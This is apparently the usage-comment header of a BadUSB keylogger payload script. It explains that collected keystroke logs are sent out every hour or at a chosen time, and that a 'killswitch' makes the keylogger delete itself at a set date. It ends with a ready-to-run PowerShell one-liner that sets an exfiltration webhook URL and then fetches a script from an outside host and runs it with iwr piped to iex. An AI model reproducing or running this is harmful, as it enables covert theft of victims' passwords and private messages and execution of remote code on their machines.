REM     The payload is set to send the logs collected every hour on the hour

REM     You maybe use the $log variable to specify a certain time instead (Use this for testing)
REM     ex: $log="09:00 pm" <-- This will send the log every night at 9pm
REM     You also have the option of setting up a killswitch to have the keylogger self delete at a certain time and date

REM     $ks="12/25/2022 10:00:00 PM" <-- This will make the keylogger self delete at 10pm on December 25th

REM     Calling the script with both a log time and killswitch will look something like this:

REM     $dc='https://link.iamjakoby.com/xxxx';$log="09:00 pm";$ks="12/25/2022 10:00:00 PM";iwr "https://jakoby.lol/m2m" | iex
